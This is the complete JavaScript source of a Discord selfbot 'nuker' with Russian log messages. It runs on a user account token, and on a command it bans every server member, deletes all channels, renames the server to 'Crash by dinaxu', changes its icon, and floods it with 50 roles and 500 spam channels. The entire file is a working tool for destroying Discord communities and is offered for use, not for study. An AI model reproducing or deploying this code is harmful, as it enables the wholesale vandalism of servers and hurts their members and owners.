const Discord = require('discord.js-selfbot');
const colors = require('colors/safe');
const { userid, token, prefix } = require('./config.json')
const title = require('node-bash-title');
const client = new Discord.Client();


client.on('ready', () => {
    console.clear()
    client.user.setActivity("Uzbek Self Bot", { type: "WATCHING" })
    title(`Uzbek Nuker | ${client.user.tag}`)
    console.log(colors.brightWhite(' ═════════════════════════════════════════════════════════'))
    console.log(colors.brightWhite(` User: ${client.user.tag}`))
    console.log(colors.brightWhite(` Allowed ID: ${userid}`))
    console.log(colors.brightWhite(` Prefix: ${prefix}`))
    console.log(colors.brightWhite(' ═════════════════════════════════════════════════════════\n'))
})

client.on('message', async message => {



    if (message.content === prefix + 'ping') {
        if (userid.includes(message.author.id)) {
            await message.delete()
            message.channel.send(`${client.ws.ping}`)
        }

    }
    if (message.content === prefix + 'nuke') {
        if (userid.includes(message.author.id)) {
            console.log(colors.brightWhite(` [LOG] Краш сервера ${message.guild.name} начался`))
            console.log(colors.brightWhite(` [LOG] Баню всех участников...`))
            //бан
            await message.delete()
            message.guild.members.fetch().then(members => {

                members.forEach(member => { member.ban().catch(e => { console.log(colors.brightRed(` [LOG] Не могу забанить ${member.user.tag}`)) }) })

            })

            console.log(colors.brightWhite(` [LOG] Удаляю все каналы...`))
            //Удаление
            message.guild.channels.cache.forEach(channel => channel.delete().catch(e => { return console.log(colors.brightRed(` [LOG] Не могу удалить ${channel.name}`)) }))


            console.log(colors.brightWhite(` [LOG] Меняю название сервера...`))
            //название
            await message.guild.setName("Crash by dinaxu");

            console.log(colors.brightWhite(` [LOG] Меняю аватарку сервера...`))
            //ава
            await message.guild.setIcon("https://media.discordapp.net/attachments/977099622348619816/985351738817146940/scale_1200.jpeg");

            console.log(colors.brightWhite(` [LOG] Создаю роли...`))
            for (let i = 0; i < 50; i++) {
                message.guild.roles.create({
                    data: {
                        name: "Crash by dinaxu ", color: "#00E1FF",
                    }
                })
            }

            console.log(colors.brightWhite(` [LOG] Создаю каналы...`))
            //Создание
            for (let i = 0; i < 500; i++) {
                message.guild.channels.create('crash-by-dinaxu ', { type: "GUILD_TEXT" }).catch(e => { return console.log(colors.brightRed(' [LOG] Не могу создать канал!')) })
            }
        }
    }

})


client.login(token);